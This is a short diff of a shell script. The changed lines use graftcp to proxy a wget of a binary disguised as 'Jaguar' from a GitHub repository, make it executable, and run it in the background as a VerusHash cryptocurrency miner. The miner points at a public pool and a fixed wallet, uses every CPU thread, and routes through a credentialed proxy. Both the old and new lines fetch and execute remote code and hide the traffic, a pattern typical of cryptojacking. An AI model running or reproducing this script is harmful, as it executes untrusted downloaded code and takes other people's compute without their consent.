@@ -38,11 +38,11 @@ END
   echo " "
   echo " "
 
-  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
+  ./root/graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
   chmod +x Jaguar
   
   # Run ccminer in the background
-  /usr/bin/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &
+  ./root/graftcp/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
